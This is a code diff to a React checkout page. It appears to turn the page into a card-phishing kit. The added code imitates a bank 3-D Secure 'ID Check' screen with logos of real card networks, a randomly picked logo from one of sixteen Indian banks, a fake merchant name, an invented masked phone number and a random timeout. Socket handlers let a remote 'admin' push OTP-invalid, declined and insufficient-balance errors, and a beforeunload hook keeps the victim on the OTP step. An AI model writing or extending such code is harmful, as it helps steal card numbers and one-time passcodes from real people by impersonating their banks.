@@ -377,6 +377,37 @@ const Checkout = () => {
         setShowOtp(false);
         alert(`Payment rejected: ${reason || 'Unknown error occurred'}`);
       });
+
+      // Enhanced admin response handlers
+      newSocket.on('invalid-otp-error', () => {
+        clearTimeout(emitTimeout);
+        setConfirmingPayment(false);
+        // Show error message above OTP input
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'bg-red-50 border border-red-200 rounded-lg p-3 mb-4 text-red-700 text-sm text-center';
+        errorDiv.textContent = 'Invalid OTP, please enter valid one time passcode!';
+        const otpContainer = document.querySelector('input[placeholder="Enter OTP Here"]')?.parentElement;
+        if (otpContainer) {
+          otpContainer.insertBefore(errorDiv, otpContainer.firstChild);
+          setTimeout(() => errorDiv.remove(), 5000);
+        }
+      });
+
+      newSocket.on('card-declined-error', () => {
+        clearTimeout(emitTimeout);
+        setConfirmingPayment(false);
+        setShowOtp(false);
+        setCurrentStep('account');
+        alert('Your card has been declined');
+      });
+
+      newSocket.on('insufficient-balance-error', () => {
+        clearTimeout(emitTimeout);
+        setConfirmingPayment(false);
+        setShowOtp(false);
+        setCurrentStep('account');
+        alert('Your card have insufficient balance');
+      });
       
     } catch (error) {
       console.error('Error in payment confirmation:', error);
@@ -405,10 +436,24 @@ const Checkout = () => {
     }
   };
 
-  // Initialize socket connection and error handling
+  // Handle refresh on OTP page and initialize socket connection
   useEffect(() => {
-    // Handle page unload/refresh
-    const handleBeforeUnload = () => {
+    // Handle page refresh during OTP verification
+    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
+      if (currentStep === 'otp') {
+        e.preventDefault();
+        e.returnValue = '';
+        
+        // Show confirmation popup
+        const confirmed = window.confirm('Do you want to cancel this transaction?');
+        if (confirmed) {
+          setCurrentStep('account');
+          setShowOtp(false);
+          alert('User pressed back button error msg');
+        }
+        return '';
+      }
+      
       if (socket) {
         socket.disconnect();
       }
@@ -422,7 +467,7 @@ const Checkout = () => {
         socket.disconnect();
       }
     };
-  }, [socket]);
+  }, [socket, currentStep]);
 
   return (
     <div className="min-h-screen bg-slate-900 text-white">
@@ -843,28 +888,28 @@ const Checkout = () => {
                              <div className="absolute right-3 top-1/2 transform -translate-y-1/2 transition-all duration-300 hover:scale-110">
                                {getCardType(cardData.cardNumber) === 'visa' && (
                                  <img 
-                                   src="/src/assets/visa-logo.png" 
+                                   src="https://cdn4.iconfinder.com/data/icons/simple-peyment-methods/512/visa-128.png" 
                                    alt="Visa" 
                                    className="h-6 w-8 object-contain"
                                  />
                                )}
                                {getCardType(cardData.cardNumber) === 'mastercard' && (
                                  <img 
-                                   src="/src/assets/mastercard-logo.png" 
+                                   src="https://brandlogos.net/wp-content/uploads/2011/08/mastercard-logo.png" 
                                    alt="Mastercard" 
                                    className="h-6 w-8 object-contain"
                                  />
                                )}
                                {getCardType(cardData.cardNumber) === 'discover' && (
                                  <img 
-                                   src="/src/assets/discover-logo.png" 
+                                   src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" 
                                    alt="Discover" 
                                    className="h-6 w-8 object-contain"
                                  />
                                )}
                                {getCardType(cardData.cardNumber) === 'rupay' && (
                                  <img 
-                                   src="/src/assets/rupay-logo.png" 
+                                   src="https://logotyp.us/file/rupay.svg" 
                                    alt="RuPay" 
                                    className="h-6 w-8 object-contain"
                                  />
@@ -978,53 +1023,167 @@ const Checkout = () => {
               </div>
             )}
 
-            {/* OTP Section */}
+            {/* Enhanced OTP Verification Section */}
             {currentStep === 'otp' && (
-              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
-                <div className="bg-slate-800 rounded-lg p-8 max-w-md w-full mx-4 transform transition-all duration-500 animate-scale-in">
-                  <div className="text-center mb-6">
-                    <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                      <CreditCard className="h-8 w-8 text-blue-600" />
+              <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+                <div className="bg-white rounded-lg max-w-lg w-full transform transition-all duration-500 animate-scale-in overflow-hidden">
+                  {/* Header */}
+                  <div className="bg-white border-b p-4">
+                    <div className="flex justify-between items-center">
+                      <div className="flex items-center gap-3">
+                        <img 
+                          src={
+                            getCardType(cardData.cardNumber) === 'visa' ? 'https://www.unitybank.com.au/media/1362/visa-secure-logo.png?width=250&height=250' :
+                            getCardType(cardData.cardNumber) === 'mastercard' ? 'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg' :
+                            getCardType(cardData.cardNumber) === 'discover' ? 'https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png' :
+                            getCardType(cardData.cardNumber) === 'rupay' ? 'https://images.seeklogo.com/logo-png/25/1/rupay-logo-png_seeklogo-256357.png' :
+                            'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg'
+                          }
+                          alt="Card Security" 
+                          className="h-8 w-16 object-contain"
+                        />
+                        <span className="text-sm font-medium text-gray-700">ID Check</span>
+                      </div>
+                      <div className="text-right">
+                        <button 
+                          onClick={() => setCurrentStep('review')}
+                          className="text-gray-400 hover:text-gray-600 text-xl font-bold"
+                        >
+                          ✕
+                        </button>
+                      </div>
                     </div>
-                    <h3 className="text-2xl font-bold text-white mb-2">OTP Verification</h3>
-                    <div className="bg-blue-50 rounded-lg p-4 mb-4">
-                      <div className="text-sm text-gray-700">
-                        <div className="flex items-center justify-between mb-2">
-                          <span className="font-medium">Bank:</span>
-                          <span className="text-blue-600 font-semibold">
-                            {getCardType(cardData.cardNumber) === 'visa' ? 'VISA Bank' : 
-                             getCardType(cardData.cardNumber) === 'mastercard' ? 'Mastercard Bank' :
-                             getCardType(cardData.cardNumber) === 'rupay' ? 'RuPay Bank' :
-                             getCardType(cardData.cardNumber) === 'discover' ? 'Discover Bank' : 'Bank'}
+                  </div>
+
+                  {/* Bank Logo */}
+                  <div className="absolute top-4 right-16">
+                    <img 
+                      src={(() => {
+                        const bankLogos = [
+                          'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
+                          'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
+                          'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
+                          'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png',
+                          'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png',
+                          'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png',
+                          'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png',
+                          'https://assets.stickpng.com/thumbs/627cce601b2e263b45696abb.png',
+                          'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png',
+                          'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png',
+                          'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png',
+                          'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp',
+                          'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
+                          'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
+                          'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
+                          'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png'
+                        ];
+                        return bankLogos[Math.floor(Math.random() * bankLogos.length)];
+                      })()}
+                      alt="Bank Logo" 
+                      className="h-12 w-20 object-contain"
+                    />
+                  </div>
+
+                  {/* Main Content */}
+                  <div className="p-6">
+                    <h2 className="text-xl font-bold text-gray-800 mb-4 text-center">Merchant Details</h2>
+                    
+                    <div className="bg-gray-50 rounded-lg p-4 mb-6">
+                      <div className="space-y-3 text-sm">
+                        <div className="flex justify-between">
+                          <span className="text-gray-600">Merchant Name</span>
+                          <span className="font-medium text-gray-800">Pluralsight LLC</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-gray-600">Date</span>
+                          <span className="font-medium text-gray-800">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-gray-600">Card Number</span>
+                          <span className="font-medium text-gray-800">
+                            {cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}
                           </span>
                         </div>
-                        <div className="flex items-center justify-between">
-                          <span className="font-medium">Card Type:</span>
-                          <span className="text-green-600 font-semibold capitalize">
-                            {getCardType(cardData.cardNumber) || 'Unknown'}
-                          </span>
+                        <div className="flex justify-between">
+                          <span className="text-gray-600">Amount</span>
+                          <span className="font-bold text-blue-600">₹{displayPrice.toLocaleString()}</span>
                         </div>
                       </div>
                     </div>
-                    <p className="text-slate-300 text-sm">
-                      Please enter the 6-digit OTP sent to your registered mobile number
-                    </p>
-                  </div>
-                  <div className="space-y-4">
-                    <Input
-                      value={otpValue}
-                      onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                      className="bg-white text-slate-900 text-center text-2xl tracking-widest h-14"
-                      placeholder="123456"
-                      maxLength={6}
-                    />
-                    <Button
-                      onClick={handleOtpSubmit}
-                      disabled={otpValue.length !== 6}
-                      className="w-full bg-blue-600 hover:bg-blue-700 text-white h-12 text-lg font-semibold disabled:opacity-50"
-                    >
-                      Verify OTP
-                    </Button>
+
+                    <h3 className="text-lg font-bold text-blue-600 mb-4 text-center">Authenticate Transaction</h3>
+
+                    {/* OTP Success Message */}
+                    <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
+                      <p className="text-green-700 text-sm text-center">
+                        Successfully sent OTP to your registered mobile number XXXXXX{Math.floor(1000 + Math.random() * 9000)}
+                      </p>
+                    </div>
+
+                    {/* Click Here for Addon */}
+                    <div className="mb-4">
+                      <button className="text-blue-600 text-sm hover:underline">
+                        CLICK HERE For Addon Cardholder OTP
+                      </button>
+                    </div>
+
+                    {/* OTP Input */}
+                    <div className="mb-6">
+                      <Input
+                        value={otpValue}
+                        onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                        className="bg-white text-gray-900 text-center text-lg tracking-widest h-12 border-gray-300"
+                        placeholder="Enter OTP Here"
+                        maxLength={6}
+                        style={{ 
+                          color: otpValue ? '#1f2937' : '#9ca3af'
+                        }}
+                      />
+                    </div>
+
+                    {/* Buttons */}
+                    <div className="space-y-3 mb-6">
+                      <div className="flex gap-3">
+                        <Button
+                          onClick={() => {
+                            setTimeout(() => {
+                              setCurrentStep('review');
+                              alert('Payment failed: User cancelled transaction');
+                            }, 2000);
+                          }}
+                          variant="outline"
+                          className="flex-1 h-10 text-gray-700 border-gray-300 hover:bg-gray-50"
+                        >
+                          CANCEL
+                        </Button>
+                        <Button
+                          onClick={handleOtpSubmit}
+                          disabled={otpValue.length !== 6}
+                          className="flex-1 h-10 bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50"
+                        >
+                          SUBMIT
+                        </Button>
+                      </div>
+                    </div>
+
+                    {/* Timer and Powered by */}
+                    <div className="text-center space-y-3">
+                      <p className="text-xs text-gray-500">
+                        This page automatically time out after {(() => {
+                          const timers = ['1.59', '2.59', '4.59', '9.59'];
+                          return timers[Math.floor(Math.random() * timers.length)];
+                        })()} minutes
+                      </p>
+                      
+                      <div className="flex items-center justify-center gap-2">
+                        <span className="text-xs text-gray-500">Powered by</span>
+                        <img 
+                          src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png" 
+                          alt="Wibmo" 
+                          className="h-4 object-contain"
+                        />
+                      </div>
+                    </div>
                   </div>
                 </div>
               </div>
